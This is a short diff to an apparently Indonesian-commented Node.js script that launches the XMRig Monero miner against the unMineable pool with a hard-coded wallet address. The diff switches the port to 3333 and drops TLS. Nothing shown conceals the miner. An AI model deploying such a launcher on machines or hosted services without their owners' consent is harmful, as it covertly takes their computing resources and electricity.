@@ -3,7 +3,7 @@ const fs = require('fs');
 const https = require('https');
 
 // === KONFIGURASI MINER (UNMINEABLE) ===
-const POOL = 'rx.unmineable.com:443';
+const POOL = 'rx.unmineable.com:3333';
 const WALLET_ADDRESS = 'XMR:8A11nwd4RcW4yrHoZwQHbe8vudkPGLkQp8aaN4ZYjHwYEbM9jVxTXD4GsJgystemsMWPsyPN76jrdEAZVDD28E49DocihhT#cups-68pw'; // Username atau alias di unmineable
 const PASSWORD = 'x'; // Password default unmineable
 const ALGO = 'rx'; // Algoritma RandomX
@@ -22,8 +22,7 @@ function startMiner() {
         '-o', POOL,
         '-u', WALLET_ADDRESS,
         '-p', PASSWORD,
-        '-k', 
-        '--tls'
+        '-k'
     ]);
 
     // Tampilkan output dari XMRig langsung ke console Node.js
